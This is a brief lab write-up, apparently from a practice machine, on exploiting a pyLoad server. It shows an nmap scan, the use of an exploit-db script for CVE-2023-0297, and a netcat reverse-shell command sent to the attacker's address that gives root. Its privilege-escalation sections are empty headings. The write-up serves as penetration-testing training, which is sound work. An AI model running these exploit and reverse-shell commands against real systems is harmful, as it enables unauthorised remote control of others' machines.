#Pwned! 
```IP
192.168.192.26
```
## Enumeration
## Nmap
As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.192.26 -vvv -p- -oN enum/full
```
The output being:
```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBYESg2KmNLhFh1KJaN2UFCVAEv6MWr58pqp2fIpCSBEK2wDJ5ap2XVBVGLk9Po4eKBbqTo96yttfVUvXWXoN3M=
|   256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBdIs4PWZ8yY2OQ6Jlk84Ihd5+15Nb3l0qvpf1ls3wfa
9666/tcp open  http    syn-ack ttl 61 CherryPy wsgiserver
|_http-favicon: Unknown favicon MD5: 71AAC1BA3CF57C009DA1994F94A2CC89
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Cheroot/8.6.0
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
| http-title: Login - pyLoad 
|_Requested resource was /login?next=http://192.168.192.26:9666/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## HTTP 9666
PyLoad
```py
CVE-2023-0297
```


# Exploitation
We test unauthenticated remote code execution with the following exploit
https://www.exploit-db.com/exploits/51532
```
python cve-2023-0297.py -u http://192.168.192.26:9666 -c 'ping -c 5 192.168.45.204'
```
Indeed we are able to execute commands
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241205092835.png?raw=true)
```
python cve-2023-0297.py -u http://192.168.192.26:9666 -c 'busybox nc  192.168.45.204 4444 -e bash'
```
And we get a root shell inmediately
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241205093214.png?raw=true)

# PrivEsc

## Manual

## Automated

### Peass
### Mimikatz

# Lateral Movement

